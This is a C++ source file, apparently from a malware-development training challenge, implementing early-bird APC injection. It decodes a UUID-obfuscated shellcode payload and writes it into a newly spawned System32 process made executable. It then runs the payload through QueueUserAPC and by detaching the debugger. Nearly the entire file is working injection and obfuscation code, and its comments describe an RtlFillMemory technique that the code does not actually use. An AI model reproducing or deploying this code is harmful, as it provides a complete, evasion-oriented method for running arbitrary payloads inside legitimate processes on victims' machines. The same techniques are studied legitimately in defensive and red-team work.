// APCInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "APC_RtlFillMemory.h"

BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR lpPath[MAX_PATH * 2];

	STARTUPINFOA            Si = { 0 };
	PROCESS_INFORMATION    Pi = { 0 };

	// Cleaning the structs by setting the element values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Creating the target process path 
	sprintf_s(lpPath, "C:\\Windows\\System32\\%s", lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	// Creating the process
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Instead of CREATE_SUSPENDED		
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Filling up the OUTPUT parameter with CreateProcessA's output
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL UuidDeobfuscation(IN const char* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer = NULL,
		TmpBuffer = NULL;
	SIZE_T          sBuffSize = NULL;
	PCSTR           Terminator = NULL;
	NTSTATUS        STATUS = NULL;

	// Getting the UuidFromStringA function's base address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("Rpcrt4.dll")), "UuidFromStringA");

	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Getting the size of the shellcode (number of elements * 16)
	sBuffSize = NmbrOfElements * 16;
	// Allocating memory that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;


	// Loop through all the addresses saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {
		// UuidArray[i] is a single UUid address from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// Failed
			printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);


	printf("\t[#] Press <Enter> To Write Payload ... ");
	//getchar();
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main()
{
	// In this challenge, we will look at using APC calls to write into a remote process memory without relying on the WriteProcessMemory windows API or the NtWriteVirtualMemory native call.
	// This can be achieved by creating a new thread in the remote process and queuing APC calls for each byte to be written into the remote memory.This can be done using either a gadget or , more conveniently, by utilizing the `RtlFillMemory` API to write a byte into the remote process.

	const char* UuidArray[] = {
		"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
		"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
		"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
		"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
		"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
		"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C6300"
	};

	PBYTE       pDeobfuscatedPayload = NULL;
	SIZE_T      sDeobfuscatedSize = NULL;
	HANDLE		hProcess = NULL,
		hThread = NULL;
	DWORD		dwProcessId = NULL;
	PVOID		pAddressTarget = NULL;

	// Prinitng some information
	// printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());

	// printf("[#] Press <Enter> To Decrypt ... ");
	// getchar();

	// printf("[i] Decrypting ...");
	UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize);

	/*Create a suspended process by using the `CREATE_SUSPENDED` flag*/
	CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread);

	/*Write the payload to the address space of the new target process*/
	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize, &pAddressTarget)) {
		return -1;
	}

	/*Get the suspended thread's handle from `CreateProcess` along with the payload's base address and pass them to `QueueUserAPC`*/
	QueueUserAPC((PAPCFUNC)pAddressTarget, hThread, NULL);

	/*Resume the thread using the `ResumeThread` WinAPI to execute the payload*/
	DebugActiveProcessStop(dwProcessId);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	CloseHandle(hProcess);
	CloseHandle(hThread);
}